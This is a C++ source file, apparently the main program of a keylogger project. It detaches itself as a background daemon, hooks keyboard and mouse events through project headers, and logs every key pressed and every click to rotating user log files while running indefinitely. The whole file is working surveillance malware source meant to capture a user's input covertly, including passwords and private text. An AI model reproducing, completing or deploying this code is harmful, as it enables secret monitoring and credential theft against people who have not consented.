#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp>
#include <boost/log/sinks/text_file_backend.hpp>
#include <boost/log/utility/setup/file.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>
#include <boost/log/sources/severity_logger.hpp>
#include <boost/log/sources/record_ostream.hpp>

#include <keylogger/hooks/keyboard.hpp>
#include <keylogger/hooks/mouse.hpp>
#include <keylogger/utils/utils.hpp>

namespace logging = boost::log;
namespace src = boost::log::sources;
namespace sinks = boost::log::sinks;
namespace keywords = boost::log::keywords;

int main(int, char* []) {
    Utils::CreateDemon();

    auto sink = logging::add_file_log(
            keywords::file_name = "user_%N.log",
            keywords::rotation_size = 10 * 1024 * 1024,
            keywords::time_based_rotation = sinks::file::rotation_at_time_point(0, 0, 0),
            keywords::format = "[%TimeStamp%]: %Message%"
    );
    logging::add_common_attributes();

    using namespace logging::trivial;
    src::severity_logger<severity_level> lg;

    KeyboardEvents keyboard;
    keyboard.ConnectHandler([&lg, &sink](Event& ev){
        BOOST_LOG_SEV(lg, info) << "User pressed: " + ((KeyboardEvent&)ev).key;
        sink->flush();
    });

    MouseEvents mouse;
    mouse.ConnectHandler([&lg, &sink](Event& ev){
        BOOST_LOG_SEV(lg, info) <<
            "User clicked: " + std::string(((MouseEvent&)ev).rightButtonClicked
                ? "Right button pressed"
                : "Left button pressed");
        sink->flush();
    });

    while(true){}

    return 0;
}